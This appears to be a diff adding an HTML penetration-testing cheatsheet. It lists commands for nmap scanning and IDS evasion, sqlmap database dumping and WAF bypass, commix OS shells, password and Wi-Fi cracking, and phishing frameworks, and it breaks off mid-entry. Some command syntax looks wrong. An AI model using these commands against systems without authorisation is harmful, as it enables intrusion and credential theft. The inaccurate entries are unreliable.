@@ -1,0 +1,1823 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Cheatsheet</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+
+</head>
+<body>
+    <div class="container">
+        <div class="tab-container">
+            <div class="tab active" onclick="showTab('cheatsheet')">Cheatsheet</div>
+            <div class="tab" onclick="showTab('portswigger')">PortSwigger Cheatsheet</div>
+            <div class="tab" onclick="showTab('windowsprivesc')">Windows PrivEsc</div>
+            <div class="tab" onclick="showTab('linuxprivesc')">Linux PrivEsc</div>
+        </div>
+
+        <div id="cheatsheet" class="tab-content active">
+            <!-- Reconnaissance Tools -->
+            <h2>Reconnaissance</h2>
+
+            <!-- Nmap Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('nmap')">Nmap - Network mapper for port scanning and service enumeration.</div>
+                <div class="tool-details" id="nmap">
+                    
+                    <h3>Target Specification</h3>
+                    <ul>
+                        <li><strong>Scan a single IP:</strong> <code>nmap 192.168.1.1</code></li>
+                        <li><strong>Scan specific IPs:</strong> <code>nmap 192.168.1.1 192.168.2.1</code></li>
+                        <li><strong>Scan a range:</strong> <code>nmap 192.168.1.1-254</code></li>
+                        <li><strong>Scan a domain:</strong> <code>nmap scanme.nmap.org</code></li>
+                        <li><strong>Scan using CIDR:</strong> <code>nmap 192.168.1.0/24</code></li>
+                        <li><strong>Scan targets from a file:</strong> <code>nmap -iL targets.txt</code></li>
+                        <li><strong>Scan random hosts:</strong> <code>nmap -iR 100</code></li>
+                        <li><strong>Exclude listed hosts:</strong> <code>nmap -exclude 192.168.1.1</code></li>
+                    </ul>
+
+                    <h3>Nmap Scan Techniques</h3>
+                    <ul>
+                        <li><strong>TCP SYN scan (Default):</strong> <code>nmap 192.168.1.1 -sS</code></li>
+                        <li><strong>TCP connect scan:</strong> <code>nmap 192.168.1.1 -sT</code></li>
+                        <li><strong>UDP port scan:</strong> <code>nmap 192.168.1.1 -sU</code></li>
+                        <li><strong>TCP ACK port scan:</strong> <code>nmap 192.168.1.1 -sA</code></li>
+                        <li><strong>TCP Window port scan:</strong> <code>nmap 192.168.1.1 -sW</code></li>
+                        <li><strong>TCP Maimon port scan:</strong> <code>nmap 192.168.1.1 -sM</code></li>
+                    </ul>
+
+                    <h3>Host Discovery</h3>
+                    <ul>
+                        <li><strong>No Scan (List targets only):</strong> <code>nmap 192.168.1.1-3 -sL</code></li>
+                        <li><strong>Disable port scanning (Host discovery only):</strong> <code>nmap 192.168.1.1/24 -sn</code></li>
+                        <li><strong>Disable host discovery (Port scan only):</strong> <code>nmap 192.168.1.1-5 -Pn</code></li>
+                        <li><strong>TCP SYN discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PS22-25,80</code></li>
+                        <li><strong>TCP ACK discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PA22-25,80</code></li>
+                        <li><strong>UDP discovery on port x:</strong> <code>nmap 192.168.1.1-5 -PU53</code></li>
+                        <li><strong>ARP discovery on local network:</strong> <code>nmap 192.168.1.1-1/24 -PR</code></li>
+                        <li><strong>Never do DNS resolution:</strong> <code>nmap 192.168.1.1 -n</code></li>
+                    </ul>
+
+                    <h3>Port Specification</h3>
+                    <ul>
+                        <li><strong>Port scan for port x:</strong> <code>nmap 192.168.1.1 -p 21</code></li>
+                        <li><strong>Port range:</strong> <code>nmap 192.168.1.1 -p 21-100</code></li>
+                        <li><strong>Scan multiple TCP/UDP ports:</strong> <code>nmap 192.168.1.1 -p U:53,T:21-25,80</code></li>
+                        <li><strong>Scan all ports:</strong> <code>nmap 192.168.1.1 -p-</code></li>
+                        <li><strong>Port scan from service name:</strong> <code>nmap 192.168.1.1 -p http,https</code></li>
+                        <li><strong>Fast port scan (100 ports):</strong> <code>nmap 192.168.1.1 -F</code></li>
+                        <li><strong>Scan top x ports:</strong> <code>nmap 192.168.1.1 -top-ports 2000</code></li>
+                        <li><strong>Leaving off initial port in range:</strong> <code>nmap 192.168.1.1 -p-65535</code></li>
+                        <li><strong>Leaving off end port in range:</strong> <code>nmap 192.168.1.1 -p0-</code></li>
+                    </ul>
+
+                    <h3>Service and Version Detection</h3>
+                    <ul>
+                        <li><strong>Service version detection:</strong> <code>nmap 192.168.1.1 -sV</code></li>
+                        <li><strong>Set version intensity (0-9):</strong> <code>nmap 192.168.1.1 -sV -version-intensity 8</code></li>
+                        <li><strong>Light mode (Faster):</strong> <code>nmap 192.168.1.1 -sV -version-light</code></li>
+                        <li><strong>Intensity level 9 (Slower):</strong> <code>nmap 192.168.1.1 -sV -version-all</code></li>
+                        <li><strong>Enable OS detection, version detection, script scanning, and traceroute:</strong> <code>nmap 192.168.1.1 -A</code></li>
+                    </ul>
+
+                    <h3>OS Detection</h3>
+                    <ul>
+                        <li><strong>Remote OS detection:</strong> <code>nmap 192.168.1.1 -O</code></li>
+                        <li><strong>OS detection with limited open/closed ports:</strong> <code>nmap 192.168.1.1 -O -osscan-limit</code></li>
+                        <li><strong>Aggressive OS guessing:</strong> <code>nmap 192.168.1.1 -O -osscan-guess</code></li>
+                        <li><strong>Set maximum OS detection tries:</strong> <code>nmap 192.168.1.1 -O -max-os-tries 1</code></li>
+                        <li><strong>Enable OS detection, version detection, script scanning, and traceroute:</strong> <code>nmap 192.168.1.1 -A</code></li>
+                    </ul>
+
+                    <h3>Timing and Performance</h3>
+                    <ul>
+                        <li><strong>Paranoid (IDS evasion):</strong> <code>nmap 192.168.1.1 -T0</code></li>
+                        <li><strong>Sneaky (IDS evasion):</strong> <code>nmap 192.168.1.1 -T1</code></li>
+                        <li><strong>Polite (less bandwidth/resource usage):</strong> <code>nmap 192.168.1.1 -T2</code></li>
+                        <li><strong>Normal (default speed):</strong> <code>nmap 192.168.1.1 -T3</code></li>
+                        <li><strong>Aggressive (fast/reliable network):</strong> <code>nmap 192.168.1.1 -T4</code></li>
+                        <li><strong>Insane (extraordinarily fast network):</strong> <code>nmap 192.168.1.1 -T5</code></li>
+                    </ul>
+
+                    <h3>Timing and Performance Switches</h3>
+                    <ul>
+                        <li><strong>Timeout after x:</strong> <code>nmap 192.168.1.1 -host-timeout 1s</code></li>
+                        <li><strong>Specify RTT time:</strong> <code>nmap 192.168.1.1 -min-rtt-timeout 1s</code></li>
+                        <li><strong>Parallel host scan group sizes:</strong> <code>nmap 192.168.1.1 -scan-delay 1s</code></li>
+                    
+                    <h3>NSE Scripts</h3>
+                    <ul>
+                        <li><strong>List all available scripts:</strong> <code>nmap --script-help=</code></li>
+                        <li><strong>Run a specific script:</strong> <code>nmap --script script_name</code></li>
+                        <li><strong>Run multiple scripts:</strong> <code>nmap --script script1,script2</code></li>
+                        <li><strong>Use a script category:</strong> <code>nmap --script category</code></li>
+                    </ul>
+
+                    <h3>Firewall/IDS Evasion Techniques</h3>
+                    <ul>
+                        <li><strong>Fragment packets:</strong> <code>nmap -f</code></li>
+                        <li><strong>Use a decoy:</strong> <code>nmap -D RND:10</code></li>
+                        <li><strong>Use a spoofed IP address:</strong> <code>nmap -S 192.168.1.100</code></li>
+                        <li><strong>Randomize target order:</strong> <code>nmap --randomize-hosts</code></li>
+                        <li><strong>Change source port:</strong> <code>nmap --source-port 53</code></li>
+                        <li><strong>Idle scan (stealth scan):</strong> <code>nmap -sI 192.168.1.100</code></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Masscan Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('masscan')">Masscan - Mass IP port scanner.</div>
+                <div class="tool-details" id="masscan">
+                    <div class="tool-command">Basic Scan: <code>masscan [target] -p[port]</code></div>
+                    <div class="tool-command">Scan a Range: <code>masscan [target-range] -p[port]</code></div>
+                </div>
+            </div>
+
+            <!-- Netdiscover Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('netdiscover')">Netdiscover - ARP scanner for discovering hosts in a network.</div>
+                <div class="tool-details" id="netdiscover">
+                    
+                    <h3>Target Specification</h3>
+                    <ul>
+                        <li><strong>Scan Local Network:</strong> <code>netdiscover -r 192.168.1.0/24</code></li>
+                        <li><strong>Scan Specific Interface:</strong> <code>netdiscover -i eth0</code></li>
+                        <li><strong>Passive Mode:</strong> <code>netdiscover -p</code></li>
+                        <li><strong>Scan Specific IP Range:</strong> <code>netdiscover -r 192.168.1.1-192.168.1.100</code></li>
+                        <li><strong>Set Time Interval Between ARP Requests:</strong> <code>netdiscover -s 50</code></li>
+                    </ul>
+                    
+                    <h3>Advanced Options</h3>
+                    <ul>
+                        <li><strong>Scan for Specific MAC Addresses:</strong> <code>netdiscover -m 00:11:22:33:44:55</code></li>
+                        <li><strong>Active Scanning Mode:</strong> <code>netdiscover -A</code></li>
+                        <li><strong>Output Results to a File:</strong> <code>netdiscover -r 192.168.1.0/24 -f output.txt</code></li>
+                        <li><strong>Set Number of Retries:</strong> <code>netdiscover -n 2</code></li>
+                    </ul>
+                    
+                </div>
+            </div>
+
+            <!-- Amass Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('amass')">Amass - DNS enumeration and network mapping tool.</div>
+                <div class="tool-details" id="amass">
+                    <div class="tool-command">Basic Enumeration: <code>amass enum -d [domain]</code></div>
+                    <div class="tool-command">DNS Bruteforce: <code>amass enum -brute -d [domain]</code></div>
+                </div>
+            </div>
+
+            <!-- Sublist3r Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('sublist3r')">Sublist3r - Subdomain enumeration tool.</div>
+                <div class="tool-details" id="sublist3r">
+                    
+                    <h3>Basic Usage</h3>
+                    <ul>
+                        <li><strong>Enumerate Subdomains:</strong> <code>sublist3r -d example.com</code></li>
+                        <li><strong>Save Results to a File:</strong> <code>sublist3r -d example.com -o output.txt</code></li>
+                        <li><strong>Specify Number of Threads:</strong> <code>sublist3r -d example.com -t 10</code></li>
+                    </ul>
+                    
+                    <h3>Search Engines and APIs</h3>
+                    <ul>
+                        <li><strong>Use Specific Search Engines:</strong> <code>sublist3r -d example.com -e google,yahoo,bing</code></li>
+                        <li><strong>Use Virustotal API:</strong> <code>sublist3r -d example.com --virustotal</code></li>
+                        <li><strong>Use Passive DNS Data:</strong> <code>sublist3r -d example.com --passive</code></li>
+                    </ul>
+                    
+                    <h3>Advanced Options</h3>
+                    <ul>
+                        <li><strong>Verbose Output:</strong> <code>sublist3r -v -d example.com</code></li>
+                        <li><strong>Enable Debug Mode:</strong> <code>sublist3r -d example.com --debug</code></li>
+                        <li><strong>Specify Timeout for HTTP Requests:</strong> <code>sublist3r -d example.com -T 20</code></li>
+                    </ul>
+                    
+                </div>
+            </div>
+
+            <!-- theHarvester Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('theHarvester')">theHarvester - Email, subdomain, and people names enumeration tool.</div>
+                <div class="tool-details" id="theHarvester">
+                    
+                    <h3>Basic Usage</h3>
+                    <ul>
+                        <li><strong>Enumerate Emails and Subdomains:</strong> <code>theHarvester -d example.com -b google</code></li>
+                        <li><strong>Specify Output File:</strong> <code>theHarvester -d example.com -b google -f output.html</code></li>
+                        <li><strong>Use All Search Engines:</strong> <code>theHarvester -d example.com -b all</code></li>
+                    </ul>
+                    
+                    <h3>Search Engine Options</h3>
+                    <ul>
+                        <li><strong>Use Specific Search Engine:</strong> <code>theHarvester -d example.com -b bing</code></li>
+                        <li><strong>Use Shodan API:</strong> <code>theHarvester -d example.com -b shodan</code></li>
+                        <li><strong>Limit Search Results:</strong> <code>theHarvester -d example.com -b google -l 500</code></li>
+                    </ul>
+                    
+                    <h3>Advanced Options</h3>
+                    <ul>
+                        <li><strong>Specify DNS Server:</strong> <code>theHarvester -d example.com -b google -e 8.8.8.8</code></li>
+                        <li><strong>Enable Verbose Mode:</strong> <code>theHarvester -d example.com -b google -v</code></li>
+                        <li><strong>Test Results for Validity:</strong> <code>theHarvester -d example.com -b google -t</code></li>
+                    </ul>
+                    
+                </div>
+            </div>
+
+            <!-- Web Application Testing Tools -->
+            <h2>Web Application Testing</h2>
+
+            <!-- Burp Suite Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('burp-suite')">Burp Suite - Web vulnerability scanner and proxy.</div>
+                <div class="tool-details" id="burp-suite">
+                    <div class="tool-command">Start Burp Suite: <code>burpsuite</code></div>
+                    <div class="tool-command">Use Proxy: Configure browser to use Burp's proxy.</div>
+                </div>
+            </div>
+
+            <!-- OWASP ZAP Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('owasp-zap')">OWASP ZAP (Zed Attack Proxy) - Web vulnerability scanner and proxy.</div>
+                <div class="tool-details" id="owasp-zap">
+                    <div class="tool-command">Start ZAP: <code>zap</code></div>
+                    <div class="tool-command">Use Proxy: Configure browser to use ZAP's proxy.</div>
+                </div>
+            </div>
+
+            <!-- SQLMAP Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('sqlmap')">SQLMAP - Automatic SQL injection and database takeover tool.</div>
+                <div class="tool-details" id="sqlmap">
+                    
+                    <h3>Basic Usage</h3>
+                    <ul>
+                        <li><strong>Scan a URL for SQL vulnerabilities:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1"</code></li>
+                        <li><strong>Specify Request Method:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --method POST</code></li>
+                        <li><strong>Specify Request Data:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --data="id=1&submit=Submit"</code></li>
+                        <li><strong>Enumerate Database Information:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs</code></li>
+                        <li><strong>Enumerate Tables:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables</code></li>
+                        <li><strong>Dump Table Data:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --dump</code></li>
+                    </ul>
+
+                    <h3>Advanced Options</h3>
+                    <ul>
+                        <li><strong>Identify SQL Injection Type:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BEUST</code></li>
+                        <li><strong>Bypass WAF/IDS:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper="between,space2comment"</code></li>
+                        <li><strong>Brute Force Password Hashes:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --passwords --batch</code></li>
+                        <li><strong>Use a Session File:</strong> <code>sqlmap -u "http://example.com/vulnerable.php?id=1" --session=session_file</code></li>
+                    </ul>
+
+                </div>
+            </div>
+
+            <!-- DirBuster Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('dirbuster')">DirBuster - Directory and file brute-forcing tool.</div>
+                <div class="tool-details" id="dirbuster">
+                    <div class="tool-command">Start Scan: <code>dirbuster -u [url] -w [wordlist]</code></div>
+                    <div class="tool-command">Specify Threads: <code>dirbuster -u [url] -w [wordlist] -t [threads]</code></div>
+                </div>
+            </div>
+
+            <!-- GoBuster Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('gobuster')">GoBuster - Directory, DNS, and virtual host brute forcing tool.</div>
+                <div class="tool-details" id="gobuster">
+                    
+                    <h3>Directory Brute Forcing</h3>
+                    <ul>
+                        <li><strong>Basic Directory Brute Force:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt</code></li>
+                        <li><strong>Specify Extensions:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt -x php,html</code></li>
+                        <li><strong>Ignore Length:</strong> <code>gobuster dir -u http://example.com -w wordlist.txt -l</code></li>
+                    </ul>
+                    
+                    <h3>DNS Brute Forcing</h3>
+                    <ul>
+                        <li><strong>Basic DNS Brute Force:</strong> <code>gobuster dns -d example.com -w wordlist.txt</code></li>
+                        <li><strong>Specify DNS Server:</strong> <code>gobuster dns -d example.com -w wordlist.txt -s 8.8.8.8</code></li>
+                        <li><strong>Show Wildcards:</strong> <code>gobuster dns -d example.com -w wordlist.txt -w</code></li>
+                    </ul>
+                    
+                    <h3>Virtual Host Brute Forcing</h3>
+                    <ul>
+                        <li><strong>Virtual Host Brute Force:</strong> <code>gobuster vhost -u http://example.com -w wordlist.txt</code></li>
+                        <li><strong>Specify HTTP Method:</strong> <code>gobuster vhost -u http://example.com -w wordlist.txt -m POST</code></li>
+                    </ul>
+                    
+                </div>
+            </div>
+
+            <!-- ffuf Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('ffuf')">ffuf - Fuzzing tool for web directories and files.</div>
+                <div class="tool-details" id="ffuf">
+                    <div class="tool-command">Start Scan: <code>ffuf -u [url]/FUZZ -w [wordlist]</code></div>
+                    <div class="tool-command">Specify Extensions: <code>ffuf -u [url]/FUZZ -w [wordlist] -e [extensions]</code></div>
+                </div>
+            </div>
+
+            <!-- wfuzz Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('wfuzz')">wfuzz - Web application brute-forcing tool.</div>
+                <div class="tool-details" id="wfuzz">
+                    <div class="tool-command">Start Fuzzing: <code>wfuzz -c -w [wordlist] -u [url]/FUZZ</code></div>
+                    <div class="tool-command">Specify Extensions: <code>wfuzz -c -w [wordlist] -u [url]/FUZZ -e [extensions]</code></div>
+                </div>
+            </div>
+
+            <!-- SQLNinja Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('sqlninja')">SQLNinja - SQL injection and database takeover tool.</div>
+                <div class="tool-details" id="sqlninja">
+                    <div class="tool-command">Basic Scan: <code>sqlninja -u [url]</code></div>
+                    <div class="tool-command">Dump Database: <code>sqlninja -u [url] --dump</code></div>
+                </div>
+            </div>
+
+            <!-- Nikto Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('nikto')">Nikto - Web server vulnerability scanner.</div>
+                <div class="tool-details" id="nikto">
+                    <div class="tool-command">Basic Scan: <code>nikto -h [host]</code></div>
+                    <div class="tool-command">Specify Port: <code>nikto -h [host] -p [port]</code></div>
+                </div>
+            </div>
+
+            <!-- Acunetix Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('acunetix')">Acunetix - Web vulnerability scanner.</div>
+                <div class="tool-details" id="acunetix">
+                    <div class="tool-command">Start Scan: <code>acunetix</code></div>
+                    <div class="tool-command">Configure Scan: Use Acunetix web interface to configure and start scans.</div>
+                </div>
+            </div>
+
+            <!-- AppSpider Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('appspider')">AppSpider - Web application security scanner.</div>
+                <div class="tool-details" id="appspider">
+                    <div class="tool-command">Start Scan: <code>appspider</code></div>
+                    <div class="tool-command">Configure Scan: Use AppSpider web interface to configure and start scans.</div>
+                </div>
+            </div>
+
+            <!-- ZAP (Zed Attack Proxy) Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('zap')">ZAP (Zed Attack Proxy) - Web vulnerability scanner and proxy.</div>
+                <div class="tool-details" id="zap">
+                    <div class="tool-command">Start ZAP: <code>zap</code></div>
+                    <div class="tool-command">Use Proxy: Configure browser to use ZAP's proxy.</div>
+                </div>
+            </div>
+
+            <!-- Arachni Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('arachni')">Arachni - Web application security scanner.</div>
+                <div class="tool-details" id="arachni">
+                    <div class="tool-command">Start Scan: <code>arachni [url]</code></div>
+                    <div class="tool-command">Specify Options: <code>arachni [url] --options [options]</code></div>
+                </div>
+            </div>
+
+            <!-- Skipfish Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('skipfish')">Skipfish - Web application security scanner.</div>
+                <div class="tool-details" id="skipfish">
+                    <div class="tool-command">Start Scan: <code>skipfish -o [output_dir] [url]</code></div>
+                    <div class="tool-command">Specify Options: <code>skipfish -o [output_dir] -S [scan_opts] [url]</code></div>
+                </div>
+            </div>
+
+            <!-- Vega Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('vega')">Vega - Web vulnerability scanner and testing platform.</div>
+                <div class="tool-details" id="vega">
+                    <div class="tool-command">Start Vega: <code>vega</code></div>
+                    <div class="tool-command">Configure Scan: Use Vega web interface to configure and start scans.</div>
+                </div>
+            </div>
+
+            <!-- WebScarab Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('webscarab')">WebScarab - Web application security testing tool.</div>
+                <div class="tool-details" id="webscarab">
+                    <div class="tool-command">Start WebScarab: <code>webscarab</code></div>
+                    <div class="tool-command">Use Proxy: Configure browser to use WebScarab's proxy.</div>
+                </div>
+            </div>
+
+            <!-- Commix Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('commix')">Commix - Automated all-in-one OS command injection and exploitation tool.</div>
+                <div class="tool-details" id="commix">
+                    <div class="tool-command">Basic Scan: <code>commix -u [url]</code></div>
+                    <div class="tool-command">Command Execution: <code>commix -u [url] --os-shell</code></div>
+                </div>
+            </div>
+
+            <!-- Metasploit Framework Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('metasploit')">Metasploit Framework - Penetration testing and exploitation framework.</div>
+                <div class="tool-details" id="metasploit">
+                    <div class="tool-command">Start Console: <code>msfconsole</code></div>
+                    <div class="tool-command">Basic Exploit: <code>use [exploit_name] -e [payload]</code></div>
+                </div>
+            </div>
+
+            <!-- Empire Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('empire')">Empire - Post-exploitation framework.</div>
+                <div class="tool-details" id="empire">
+                    <div class="tool-command">Start Empire: <code>empire</code></div>
+                    <div class="tool-command">Basic Command: <code>agents</code></div>
+                </div>
+            </div>
+
+            <!-- PowerSploit Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('powersploit')">PowerSploit - PowerShell post-exploitation framework.</div>
+                <div class="tool-details" id="powersploit">
+                    <div class="tool-command">Start PowerShell: <code>powershell</code></div>
+                    <div class="tool-command">Run Script: <code>Invoke-Shellcode</code></div>
+                </div>
+            </div>
+
+            <!-- Veil-Framework Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('veil')">Veil-Framework - Payload generation and obfuscation framework.</div>
+                <div class="tool-details" id="veil">
+                    <div class="tool-command">Start Veil: <code>veil</code></div>
+                    <div class="tool-command">Generate Payload: <code>generate</code></div>
+                </div>
+            </div>
+
+            <!-- Bettercap Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('bettercap')">Bettercap - Network attack and monitoring framework.</div>
+                <div class="tool-details" id="bettercap">
+                    <div class="tool-command">Start Bettercap: <code>bettercap</code></div>
+                    <div class="tool-command">Network Scan: <code>net.probe</code></div>
+                </div>
+            </div>
+
+            <!-- Responder Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('responder')">Responder - LLMNR, NBT-NS, and MDNS poisoner.</div>
+                <div class="tool-details" id="responder">
+                    <div class="tool-command">Start Responder: <code>responder -I [interface]</code></div>
+                    <div class="tool-command">Specify Protocols: <code>responder -I [interface] -r</code></div>
+                </div>
+            </div>
+
+            <!-- CrackMapExec Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('crackmapexec')">CrackMapExec (CME) - Post-exploitation tool for Windows systems.</div>
+                <div class="tool-details" id="crackmapexec">
+                    <div class="tool-command">Basic Scan: <code>crackmapexec smb [target]</code></div>
+                    <div class="tool-command">Enumerate Users: <code>crackmapexec smb [target] --users</code></div>
+                </div>
+            </div>
+
+            <!-- Password Cracking Tools -->
+            <h2>Password Cracking</h2>
+
+            <!-- John the Ripper Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('john')">John the Ripper - Password hash cracker.</div>
+                <div class="tool-details" id="john">
+                    <div class="tool-command">Basic Cracking: <code>john [hashfile]</code></div>
+                    <div class="tool-command">Specify Wordlist: <code>john --wordlist=[wordlist] [hashfile]</code></div>
+                </div>
+            </div>
+
+            <!-- Hashcat Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('hashcat')">Hashcat - Password hash cracker.</div>
+                <div class="tool-details" id="hashcat">
+                    <div class="tool-command">Basic Cracking: <code>hashcat -a 0 -m [hash_type] [hashfile] [wordlist]</code></div>
+                    <div class="tool-command">Specify Rules: <code>hashcat -a 0 -m [hash_type] [hashfile] [wordlist] -r [rulefile]</code></div>
+                </div>
+            </div>
+
+            <!-- Hydra Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('hydra')">Hydra - Password brute-forcing tool.</div>
+                <div class="tool-details" id="hydra">
+                    <div class="tool-command">Basic Attack: <code>hydra -l [user] -P [passwordlist] [target] [protocol]</code></div>
+                    <div class="tool-command">Specify Options: <code>hydra -l [user] -P [passwordlist] [target] [protocol] -s [port]</code></div>
+                </div>
+            </div>
+
+            <!-- Patator Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('patator')">Patator - Multi-threaded password cracker.</div>
+                <div class="tool-details" id="patator">
+                    <div class="tool-command">Basic Attack: <code>patator http-fuzz -url [url] -post '[data]' -head '[headers]' -x POST -d [wordlist]</code></div>
+                    <div class="tool-command">Specify Options: <code>patator http-fuzz -url [url] -post '[data]' -x POST -d [wordlist] -s [threads]</code></div>
+                </div>
+            </div>
+
+            <!-- Information Gathering Tools -->
+            <h2>Information Gathering</h2>
+
+            <!-- Whois Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('whois')">Whois - Domain information gathering tool.</div>
+                <div class="tool-details" id="whois">
+                    <div class="tool-command">Basic Query: <code>whois [domain]</code></div>
+                    <div class="tool-command">Specify Server: <code>whois -h [server] [domain]</code></div>
+                </div>
+            </div>
+
+            <!-- nslookup Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('nslookup')">nslookup - DNS query tool for querying DNS servers.</div>
+                <div class="tool-details" id="nslookup">
+                    <div class="tool-command">Basic Query: <code>nslookup [domain]</code></div>
+                    <div class="tool-command">Specify DNS Server: <code>nslookup [domain] [dns_server]</code></div>
+                </div>
+            </div>
+
+            <!-- Droopescan Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('droopescan')">Droopescan - Plugin-based CMS security scanner.</div>
+                <div class="tool-details" id="droopescan">
+                    <div class="tool-command">Basic Scan: <code>droopescan scan wordpress -u [url]</code></div>
+                    <div class="tool-command">Specify Plugins: <code>droopescan scan wordpress -u [url] -p [plugins]</code></div>
+                </div>
+            </div>
+
+            <!-- EyeWitness Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('eyewitness')">EyeWitness - Screenshot utility and web scanner.</div>
+                <div class="tool-details" id="eyewitness">
+                    <div class="tool-command">Basic Usage: <code>EyeWitness.py -f [file] -d [directory]</code></div>
+                    <div class="tool-command">Capture Screenshots: <code>EyeWitness.py -f [file] -d [directory] --headless</code></div>
+                </div>
+            </div>
+
+            <!-- Google Dorks Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('googledorks')">Google Dorks - Google search query strings to find vulnerable websites.</div>
+                <div class="tool-details" id="googledorks">
+                    <div class="tool-command">Basic Dork: <code>site:[domain] [dork]</code></div>
+                    <div class="tool-command">Example: <code>site:example.com inurl:admin</code></div>
+                </div>
+            </div>
+
+            <!-- Wireless Attacks Tools -->
+            <h2>Wireless Attacks</h2>
+
+            <!-- Aircrack-ng Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('aircrack-ng')">Aircrack-ng - Wireless network cracking tool.</div>
+                <div class="tool-details" id="aircrack-ng">
+                    <div class="tool-command">Crack WPA/WPA2: <code>aircrack-ng [capture_file] -w [wordlist]</code></div>
+                    <div class="tool-command">Monitor Mode: <code>airmon-ng start [interface]</code></div>
+                </div>
+            </div>
+
+            <!-- Reaver Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('reaver')">Reaver - Brute-forcing WPS PINs to recover WPA/WPA2 passphrases.</div>
+                <div class="tool-details" id="reaver">
+                    <div class="tool-command">Start Reaver: <code>reaver -i [interface] -b [bssid] -vv</code></div>
+                    <div class="tool-command">Specify Pin: <code>reaver -i [interface] -b [bssid] -p [pin]</code></div>
+                </div>
+            </div>
+
+            <!-- Kismet Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('kismet')">Kismet - Wireless network detector, sniffer, and IDS.</div>
+                <div class="tool-details" id="kismet">
+                    <div class="tool-command">Start Kismet: <code>kismet</code></div>
+                    <div class="tool-command">Specify Interface: <code>kismet -c [interface]</code></div>
+                </div>
+            </div>
+
+            <!-- Social Engineering Tools -->
+            <h2>Social Engineering</h2>
+
+            <!-- Setoolkit Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('setoolkit')">Setoolkit (Social Engineer Toolkit) - Social engineering attack framework.</div>
+                <div class="tool-details" id="setoolkit">
+                    <div class="tool-command">Start SET: <code>setoolkit</code></div>
+                    <div class="tool-command">Choose Attack: Follow prompts to choose and configure attacks.</div>
+                </div>
+            </div>
+
+            <!-- Evilginx2 Tool Row -->
+            <div class="tool-row">
+                <div class="tool-name" onclick="toggleDetails('evilginx2')">Evilginx2 - Advanced man-in-the-middle attack framework.</div>
+                <div class="tool-details" id="evilginx2">
+                    <div class="tool-command">Start Evilginx2: <code>evilginx2</code></div>
